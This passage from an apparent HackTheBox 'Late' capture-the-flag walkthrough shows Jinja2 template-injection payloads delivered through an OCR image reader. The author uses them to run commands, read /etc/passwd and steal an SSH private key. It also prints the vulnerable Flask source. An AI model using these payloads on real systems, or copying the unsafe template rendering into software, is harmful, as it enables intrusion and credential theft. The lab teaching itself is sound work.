11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">Config</span> <span class="p">{</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">ENV</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">production</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;,</span>
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">DEBUG</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">False</span><span class="p">,</span> <span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">TESTING</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">False</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">PROPAGATE_EXCEPTIONS</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">None</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">PRESERVE_CONTEXT_ON_EXCEPTION</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">None</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">SECRET_KEY</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">b</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">_5</span><span class="err">#</span><span class="nx">y2L</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">34</span><span class="p">;</span><span class="nx">F4Q8z</span><span class="err">\</span><span class="nx">n</span><span class="err">\</span><span class="nx">xec</span><span class="p">]</span><span class="o">/&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">PERMANENT_SESSION_LIFETIME</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">datetime</span><span class="p">.</span><span class="nx">timedelta</span><span class="p">(</span><span class="mi">31</span><span class="p">),</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">USE_X_SENDFILE</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">False</span><span class="p">,</span> <span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">SERVER_NAME</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">None</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">APPLICATION_ROOT</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="sr">/&amp;#39;,</span><span class="err"> 
</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">SESSION_COOKIE_NAME</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">session</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">SESSION_COOKIE_DOMAIN</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">False</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">SESSION_COOKIE_PATH</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">None</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">SESSION_COOKIE_HTTPONLY</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">True</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">SESSION_COOKIE_SECURE</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">False</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">SESSION_COOKIE_SAMESITE</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">None</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">SESSION_REFRESH_EACH_REQUEST</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">True</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">MAX_CONTENT_LENGTH</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">None</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">SEND_FILE_MAX_AGE_DEFAULT</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">None</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">TRAP_BAD_REQUEST_ERRORS</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">None</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">TRAP_HTTP_EXCEPTIONS</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">False</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">EXPLAIN_TEMPLATE_LOADING</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">False</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">PREFERRED_URL_SCHEME</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">http</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">JSON_AS_ASCII</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">True</span><span class="p">,</span> <span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">JSON_SORT_KEYS</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">True</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">JSONIFY_PRETTYPRINT_REGULAR</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">False</span><span class="p">,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">JSONIFY_MIMETYPE</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">application</span><span class="o">/</span><span class="nx">json</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;,</span> 
<span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">TEMPLATES_AUTO_RELOAD</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span> <span class="nx">None</span><span class="p">,</span> <span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="nx">MAX_COOKIE_SIZE</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;:</span>
<span class="mi">4093</span><span class="p">}</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span></pre></table></code></div></div><p>This executed as well, but unfortunately there did not seem to be anything useful in the output.</p><h3 id="frustrations-with-the-ocr-text-parser">Frustrations with the OCR text parser</h3><p>After the two simple code execution successes, I decided to go for code execution using the more complicated Python core object method chains in the examples. This is where I started to run into problems with the optical character recognition software.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_11_scan_error.png" alt="An error received after uploading a payload with quotes in it" /></p><p>On of the payloads I tried had single quotes in it, which led to an error. It looked like it read a quote and something broke, which looked promising.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{{</span> <span class="n">request</span><span class="p">.</span><span class="n">application</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">__import__</span><span class="p">(</span><span class="s">'os'</span><span class="p">).</span><span class="n">popen</span><span class="p">(</span><span class="s">'id'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
</pre></table></code></div></div><p>I sent the above payload based on the request module (which is supposedly included in Jinja/Flask), trying to get the system to run the command <code class="language-plaintext highlighter-rouge">id</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>&lt;p&gt;avi.request.apphlication. gloDdDals.. Duilltins . Import__ (os ).popen(ild ).read) 5 ¢
&lt;/p&gt;
</pre></table></code></div></div><p>My <code class="language-plaintext highlighter-rouge">results.txt</code> contained garbled output. It looked like I was dealing with limitations of the text scanner.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_12_scan_error2.png" alt="error reading the image saying no globals attribute" /></p><blockquote><p>Error occured while processing the image: ‘method object’ has no attribute ‘globals_’</p></blockquote><p>I tried the same payload with a larger font and got the above error message. It looked like the code might actually be executing! I wasn’t sure at this point if the <code class="language-plaintext highlighter-rouge">globals</code> attribute was actually missing or if it had misread the text again.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s">'abc'</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">96</span><span class="p">].</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">0</span><span class="p">].</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">0</span><span class="p">](</span><span class="s">'test.txt'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
</pre></table></code></div></div><p>I decided to try another payload to see if it could read it better. My next payload used a different chain based on the String class.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>&lt;p&gt;"abc'. class. base. subclasses ()[96]. subclasses ()[0]. subclasses ()[0]( */etc/passwd|' ).read()

&lt;/p&gt;
</pre></table></code></div></div><p>After getting back <code class="language-plaintext highlighter-rouge">results.txt</code> I started thinking that this scanner was not so great! It did not seem to recognize underscores at all, which could be a problem since this method of exploitation relied on Python inner workings that had lots of underscores. I decided to try using variations of themes, fonts, colors, and sizes to see if I could coax the scanner into reading my payload images.</p><h3 id="one-day-later">one day later…</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_13_test_upload6.png" alt="the payload that almost seemed to work" /></p><p>After what seemed like a million tries, using the Kate theme and Noto Serif Regular font (size 12), I was able to get the reader to read my text enough to return something a bit different than the garbled output it had been giving up to that point.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>&lt;p&gt;subclasses__()[0]("/etc/passwd").read()
&lt;/p&gt;
</pre></table></code></div></div><p>Unfortunately the output showed that it was running something…but it stopped reading just before the final part. It looked like maybe a random space was inserted. Spaces and underscores were the worst to deal with.</p><h3 id="another-day-later">another day later…</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_16_test_payload.png" alt="a version of the requests payload that almost worked" /></p><p>I sent many variations of the different payloads; each one getting back slightly different errors, output, or garbled text. This payload gave me an error that seemed very promising.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_17_so_close.png" alt="An error message saying there was no such module" /></p><p>This error message was a bit discouraging until I noticed one tiny thing in the output: there was a space before <code class="language-plaintext highlighter-rouge">os</code>. It seemed like the parser had put an extra space before the module name, which caused Python to throw an error. Re-energized, I tried different variations in the text to try to get it to read the module name correctly.</p><h3 id="a-working-payload">A working payload</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_18_final_payload.png" alt="the working payload" /></p><p>I tried a lot of variations in spacing and quotes once I got a font that seemed to be readable enough to get code execution.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>&lt;p&gt;uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)

&lt;/p&gt;
</pre></table></code></div></div><p>Using the above payload I finally got back a response with shell command code execution !!!!!! The output verified the information I had gotten from a previous error message and showed the web app was running as the user <code class="language-plaintext highlighter-rouge">svc_acc</code>. I was very elated at this time, and tried to run other commands using this as a template.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>   {{ request.application._ _ globals_ _ . _ _builtins_ _ . _ _import_ _( "os" ).popen( "id" ).read() }}
</pre></table></code></div></div><p>The payload that finally worked was as above (note the odd spaces). I had to format it like this with the Noto Serif Regular Font (size 12) on the Kali-Dark theme. It took me hundreds of iterations with different fonts, themes, spacing, quotes, etc to get this to finally work.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_18_settings.png" alt="the settings I used to get a working payload" /></p><h3 id="etcpasswd">/etc/passwd</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_19_passwd.png" alt="the payload that let me get etc password" /></p><p>It took me another 5 tries of adjusting spaces to get the payload to work with my next command <code class="language-plaintext highlighter-rouge">cat /etc/passwd</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre>&lt;p&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
saned:x:115:119::/var/lib/saned:/usr/sbin/nologin
colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin
smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin

&lt;/p&gt;
</pre></table></code></div></div><p>I was excited to finally get this to work after a few days of trying, but now I was tired of playing with the OCR and wanted to be done. Since I already had the username of the service was running under, I hoped that it would allow me to quickly gain a foothold on this machine with a minimum of commands sent, and with the least special characters used.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
</pre></table></code></div></div><p>Inexplicably this service account could log in with a shell, so I hoped they would also have an SSH key I could steal. If not, I would add my key to an <code class="language-plaintext highlighter-rouge">authorized_keys</code> file, creating it if I had to. I had the path to the user’s home directory already, so I crafted my next payload to target the SSH key.</p><h3 id="id_rsa">id_rsa</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_20_idRsa.png" alt="The payload used to get the ssh key" /></p><p>I had to play with spacing a bit again to get the next command to work, but it was not near as much trouble now that I could get the OCR to (somewhat) consistently read the payloads I sent.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/late_21_rsa_key.png" alt="The SSH key for the service account" /></p><p>It was an extreme relief to see that my hunch was right, and that the default SSH key name had been used. I copied the SSH private key to another file and used it to log in as <code class="language-plaintext highlighter-rouge">svc_acc</code>.</p><h2 id="initial-foothold">Initial Foothold</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kalimaa)-[~/htb/late]
└─$ ssh svc_acc@10.10.11.156 -i late.key
svc_acc@late:~$ id &amp;&amp; hostname
uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
late
</pre></table></code></div></div><p>Finally, after a couple days of struggling with getting the OCR to read my payloads correctly, I had a solid foothold on the machine, and longer had to rely on inconsistent methods of code execution.</p><h3 id="usertxt">User.txt</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>svc_acc@late:~$ ls -la
total 3052
drwxr-xr-x 7 svc_acc svc_acc    4096 Jul 24 16:19 .
drwxr-xr-x 3 root    root       4096 Jan  5  2022 ..
drwxrwxr-x 7 svc_acc svc_acc    4096 Apr  4 13:28 app
lrwxrwxrwx 1 svc_acc svc_acc       9 Jan 16  2022 .bash_history -&gt; /dev/null
-rw-r--r-- 1 svc_acc svc_acc    3771 Apr  4  2018 .bashrc
drwx------ 3 svc_acc svc_acc    4096 Apr  7 13:51 .cache
drwx------ 3 svc_acc svc_acc    4096 Jan  5  2022 .gnupg
drwxrwxr-x 5 svc_acc svc_acc    4096 Jan  5  2022 .local
-rw-r--r-- 1 svc_acc svc_acc     807 Apr  4  2018 .profile
-rw-rw-r-- 1 svc_acc svc_acc      66 Jul 24 15:53 .selected_editor
drwx------ 2 svc_acc svc_acc    4096 Jul 24 16:28 .ssh
-rw-r----- 1 root    svc_acc      33 Jul 24 08:08 user.txt
svc_acc@late:~$ cat user.txt 
e8ac4218cdd6aa81fa71c1ae2cb8fcdb
</pre></table></code></div></div><p>The user flag was waiting for me in the home folder of <code class="language-plaintext highlighter-rouge">svc_acc</code>.</p><h2 id="path-to-power-gaining-administrator-access">Path to Power (Gaining Administrator Access)</h2><h3 id="enumeration-as-user-svc_acc">Enumeration as user <code class="language-plaintext highlighter-rouge">svc_acc</code></h3><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">datetime</span>
<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">random</span>
<span class="kn">from</span> <span class="nn">flask.templating</span> <span class="kn">import</span> <span class="n">render_template_string</span>
<span class="kn">from</span> <span class="nn">werkzeug.utils</span> <span class="kn">import</span> <span class="n">secure_filename</span>
<span class="kn">import</span> <span class="nn">PIL.Image</span>
<span class="kn">import</span> <span class="nn">pytesseract</span>
<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">send_file</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="n">upload_dir</span> <span class="o">=</span> <span class="s">"/home/svc_acc/app/uploads"</span>
<span class="n">misc_dir</span> <span class="o">=</span> <span class="s">'/home/svc_acc/app/misc'</span>
<span class="n">allowed_extensions</span> <span class="o">=</span>  <span class="p">[</span><span class="s">"jpg"</span> <span class="p">,</span><span class="s">'png'</span><span class="p">]</span>
<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'_5#y2L"F4Q8z</span><span class="se">\n\xec</span><span class="s">]/'</span>


<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="s">"Image Reader"</span><span class="p">)</span>


<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/scanner'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">scan_file</span><span class="p">():</span>
    <span class="n">scanned_text</span> <span class="o">=</span> <span class="s">''</span>
    <span class="n">results</span> <span class="o">=</span> <span class="s">''</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">:</span>
        <span class="n">start_time</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">()</span>
        <span class="n">f</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="s">'file'</span><span class="p">]</span>

        <span class="k">if</span> <span class="n">f</span><span class="p">.</span><span class="n">filename</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="ow">in</span> <span class="n">allowed_extensions</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">ID</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">))</span>
                <span class="n">file_name</span> <span class="o">=</span> <span class="n">upload_dir</span> <span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="n">secure_filename</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">filename</span> <span class="p">)</span><span class="o">+</span> <span class="n">ID</span>
                <span class="n">f</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="n">file_name</span><span class="p">)</span>
                <span class="n">pytesseract</span><span class="p">.</span><span class="n">pytesseract</span><span class="p">.</span><span class="n">tesseract_cmd</span> <span class="o">=</span> <span class="sa">r</span><span class="s">'/usr/bin/tesseract'</span>
                <span class="n">scanned_text</span> <span class="o">=</span> <span class="n">pytesseract</span><span class="p">.</span><span class="n">image_to_string</span><span class="p">(</span><span class="n">PIL</span><span class="p">.</span><span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">))</span>

                <span class="n">results</span> <span class="o">=</span> <span class="s">"""&lt;p&gt;{}&lt;/p&gt;"""</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">scanned_text</span><span class="p">)</span>

                <span class="n">r</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">results</span><span class="p">)</span>
                <span class="n">path</span> <span class="o">=</span> <span class="n">misc_dir</span> <span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="n">ID</span> <span class="o">+</span> <span class="s">'_'</span> <span class="o">+</span> <span class="s">'results.txt'</span>

                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

                <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span><span class="n">attachment_filename</span><span class="o">=</span><span class="s">'results.txt'</span><span class="p">)</span>

            <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="k">return</span> <span class="p">(</span><span class="s">'Error occured while processing the image: '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
	    <span class="k">else</span><span class="p">:</span>
         <span class="k">return</span> <span class="s">'Invalid Extension'</span>
